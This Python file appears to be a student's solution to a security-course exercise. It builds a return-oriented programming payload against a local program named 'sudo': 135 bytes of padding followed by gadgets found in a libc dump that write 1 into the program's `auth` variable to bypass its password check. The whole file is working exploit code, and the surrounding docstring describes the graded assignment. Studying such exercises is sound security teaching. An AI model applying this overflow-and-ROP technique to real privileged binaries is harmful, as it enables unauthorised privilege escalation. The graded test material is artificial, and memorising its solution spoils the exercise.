import os
import sys
import base64

import addresses
from infosec.core import assemble
from search import GadgetSearch
import struct

PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP Write Gadget, modify the
    `auth` variable and print `Victory!`. Make sure to return a `bytes` object
    and not an `str` object.

    NOTES:
    1. Use `addresses.AUTH` to get the address of the `auth` variable.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    pop_eax_add = search.find("pop eax")
    pop_edx_add = search.find("pop edx")
    mov_eax_edx_add = search.find("mov [eax] , edx") 

    
    auth_add = struct.pack("<I",addresses.AUTH)
    auth_val = struct.pack(">I", 0x00000001)

    pop_eax = struct.pack("<I", pop_eax_add)
    pop_edx = struct.pack("<I", pop_edx_add)
    mov_eax_edx =  struct.pack("<I", mov_eax_edx_add)

    code = pop_eax + auth_add + pop_edx + auth_val + mov_eax_edx

    original_address = struct.pack("<I", 0x080488b0)

    return bytes([0x64]*135) + code + original_address


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
